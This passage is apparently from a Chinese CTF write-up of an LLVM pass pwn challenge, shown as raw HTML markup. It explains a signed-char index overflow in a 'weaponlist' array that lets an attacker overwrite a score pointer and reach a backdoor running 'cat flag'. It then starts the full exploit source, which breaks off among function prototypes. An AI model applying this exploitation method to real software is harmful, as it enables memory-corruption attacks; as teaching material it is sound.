class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">              &amp;std::cout,</span><br><span class="line">              <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v24 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);</span><br><span class="line">      weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">0x20</span>);<span class="comment">// 将value赋值给weaponlist，漏洞出现的地方</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v33;                          <span class="comment">// 用于记录map中已经存在的函数个数</span></span><br><span class="line">    v31[<span class="number">1</span>] = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v34, <span class="number">0LL</span>);</span><br><span class="line">    <span class="comment">// 将v34迭代器向前推进一个位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  v31[<span class="number">0</span>] = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">  <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>==(&amp;v34, v31) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// 当前函数不存在map中，输出</span></span><br><span class="line">    v25 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;wow!! you find a new weapon&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v25, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v37;</span><br><span class="line">  v29[<span class="number">0</span>] = llvm::Value::<span class="built_in">getName</span>(CalledFunction);<span class="comment">// 获取函数名</span></span><br><span class="line">  v29[<span class="number">1</span>] = v26;                     <span class="comment">// 处理函数的参数</span></span><br><span class="line">  llvm::<span class="function">StringRef::<span class="keyword">operator</span> <span class="title">std::string</span><span class="params">(v30, v29)</span></span>;<span class="comment">// 将v29转换为StringRef类型对象后存储在v30中</span></span><br><span class="line">  *(_BYTE *)std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;funMap[abi:cxx11], v30) = v28;<span class="comment">// 将该函数插入map中</span></span><br><span class="line">  std::string::~<span class="built_in">string</span>(v30);</span><br><span class="line">&#125;</span><br><span class="line">std::string::~<span class="built_in">string</span>(v58);</span><br></pre></td></tr></table></figure><p>由于比较重要，所以代码中写了很多注释，下面就只讲讲几个比较重要的点：<br>代码中遍历的时候是按照函数名大小遍历的，所以我们在利用该段代码的时候要注意函数的命名<br>漏洞出现在<code>weaponlist[v33] = *(_BYTE *)(v24 + 0x20);</code>这一段代码<br>该<code>weaponlist</code>数组是通过<code>char</code>类型的<code>v33</code>进行索引的，而有符号<code>char</code>类型的范围是<code>-128 ~ +127</code>，也就是说，当<code>v33</code>的值为<code>127</code>时，此时加<code>1</code>，<code>v33</code>的值会变成<code>-128</code>而不是<code>128</code>，所以我们可以利用这个点来造成数组后溢来修改后面的值<br>在<code>weaponlist</code>数组后存在的数据：  </p><img src="/2024/03/15/llvm/11.png" class="" title="我的图图呢">  <p>可以看见<code>score</code>指针就在其后面，如果我们可以利用数组后溢来改写<code>score</code>指针指向一个很大的值的地址，那么我们在使用<code>fight</code>函数时就可以满足<code>backdoor</code>函数的调用条件从而进入<code>backdoor</code>函数，而<code>cmd</code>已经在前面被我们改写成<code>&quot;cat flag&quot;</code>，所以进入<code>backdoor</code>函数后我们即可获得<code>flag</code><br>完整<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux000</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux001</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux002</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux003</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux004</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux005</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux006</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux007</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux008</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux009</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux010</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux011</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux012</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux013</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux014</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux015</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux016</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux017</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux018</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux019</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux020</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux021</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux022</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux023</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux024</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux025</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux026</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux027</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux028</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux029</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux030</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux031</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux032</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux033</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux034</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux035</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux036</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux037</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux038</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux039</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux040</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux041</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux042</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux043</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux044</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux045</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux046</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux047</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux048</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux049</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux050</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux051</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux052</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux053</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux054</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux055</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux056</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux057</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux058</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux059</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux060</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux061</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux062</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux063</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux064</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux065</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux066</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux067</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux068</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux069</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux070</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux071</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux072</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux073</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux074</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux075</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux076</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux077</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux078</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux079</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux080</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux081</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux082</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux083</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux084</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux085</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux086</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux087</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux088</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux089</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux090</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux091</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux092</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux093</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux094</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux095</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux096</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux097</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux098</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux099</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux100</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux101</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux102</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux103</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux104</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux105</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux106</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux107</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux108</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux109</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux110</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux111</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux112</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux113</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux114</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux115</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux116</span><span class="params">(<span 